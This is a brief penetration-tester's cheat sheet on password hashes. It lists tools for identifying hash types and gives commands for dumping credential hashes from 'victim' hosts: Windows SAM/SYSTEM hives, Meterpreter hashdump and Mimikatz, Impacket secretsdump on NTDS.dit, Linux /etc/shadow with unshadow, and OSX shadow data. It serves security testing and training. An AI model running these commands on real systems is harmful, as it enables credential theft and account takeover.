# Identifying Hash Types
In Kali:
- `Hash-identifier`
- `hashid`

Online:
Hash Analyzer: https://www.tunnelsup.com/hash-analyzer/


# Dumping Hashes
## Windows:
- On Victim Windows:
    `reg.exe
    reg save HKLM\sam sam
    reg save HKLM\system system`
- On Kali (after transferring `sam` and `system` files)
    `samdump2
    samdump2 SYSTEM SAM > hashes.db`
### Meterpreter 
- HashDump: `run post/windows/gather/hashdump`
- Meterpreter Mimikatz (Post Exploitation must be executed from SYSTEM privileges)
    `load mimikatz
    creds_all
    DUMP LSA SECRETS`
### Impacket Tools:
- `secretsdump.py -ntds ~/Extract/ntds.dit -system ~/Extract/SYSTEM -hashes lmhash:nthash LOCAL -outputfile ntlm-hashes`
If you have the NTDS.dit file and the SYSTEM hive:
- `secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL`
### Other Tools
- PS Empire: `lsadump.py sys_backup.hiv sec_backup.hiv`
- Creddump7: `pwdump.py sys_backup.hiv sec_backup.hiv`

## Linux
Requires Root Privileges
1. copy `/etc/passwd` and `/etc/shadow` from Victim Linux system locally
2. `unshadow passwd shadow`
3. `Hashcat`/`john` (see sections below for more detail)

## OSX
- 10.5-10.7: `dscl localhost -read /Search/Users/|grep GeneratedUID|cut -c15-cat /var/db/shadow/hash/ | cut -c169-216 > osx_hash.txt`
- 10.8-10.12: `sudo defaults read /var/db/dslocal/nodes/Default/users/.plist ShadowHashData|tr -dc ‘0-9a-f’|xxd -p -r|plutil -convert xml1 - -o -`

## Other Resources:
Lsassy: https://github.com/Hackndo/lsassy
Mimikatz resource That Stephen R shared: https://adsecurity.org/?page_id=1821